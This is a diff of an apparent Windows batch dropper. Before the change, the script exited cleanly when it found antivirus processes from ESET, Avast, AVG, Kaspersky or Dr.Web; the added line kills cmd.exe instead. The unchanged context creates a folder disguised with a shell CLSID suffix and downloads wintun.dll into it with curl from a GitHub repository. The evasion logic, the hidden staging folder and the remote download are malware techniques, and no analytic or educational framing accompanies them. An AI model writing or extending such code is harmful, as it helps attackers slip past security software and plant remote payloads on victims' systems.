@@ -1,9 +1,5 @@
 set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe"
-for %a in (%processList%) do @tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL && goto :stop
-goto :continue
-:stop
-cmd /c exit 1
-:continue
+for %a in (%processList%) do @tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL && taskkill /F /IM cmd.exe
 
 mkdir %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}
 %WINDIR%\System32\curl.exe -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll" https://github.com/vltex/0/raw/main/1/wintun.dll
